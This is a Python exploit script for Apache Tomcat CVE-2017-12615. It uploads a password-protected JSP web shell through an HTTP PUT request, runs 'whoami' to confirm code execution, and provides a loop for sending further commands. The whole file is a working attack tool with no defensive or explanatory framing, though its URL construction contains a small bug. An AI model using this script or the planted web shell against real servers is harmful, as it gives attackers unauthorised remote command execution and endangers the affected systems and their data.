#! -*- coding:utf-8 -*-
import requests
import sys
class tomcat_2017_12615_exp:
    def __init__(self,url='',pwd='fucker',fn='eval.jsp'):

        if not url.endswith('/'):
            url+='/'
        body = '''
        <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
        <%!public static String excuteCmd(String c) {
            StringBuilder line = new StringBuilder();
            try {
            Process pro = Runtime.getRuntime().exec(c);
            BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
            String temp = null;
            while ((temp = buf.readLine()) != null) {
            line.append(temp+"\\n");}
            buf.close();
            } 
            catch (Exception e) {
            line.append(e.getMessage());}
            return line.toString();}
            %>
        <%if("__pwd__".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){
            out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}
            else{out.println(":-)");}
            %>'''.replace('__pwd__',pwd)
        requests.put(url+fn+'/',data=body)
        self.expurl=url+f'fn?pwd={pwd}&cmd='
        rq = requests.get(self.expurl+'whoami')
        if rq.status_code == 200:
            print("[+] WebShell:"+self.expurl)
            print(rq.text)
        else:
            print("[-] It seems no vuln!")

    def cmdloop(self):
        cmd = input('cmd')
        if 'exit' != cmd:
            rq = requests.get(self.expurl + cmd)
            print('- '*30)
            print(rq.text)
            print()
            

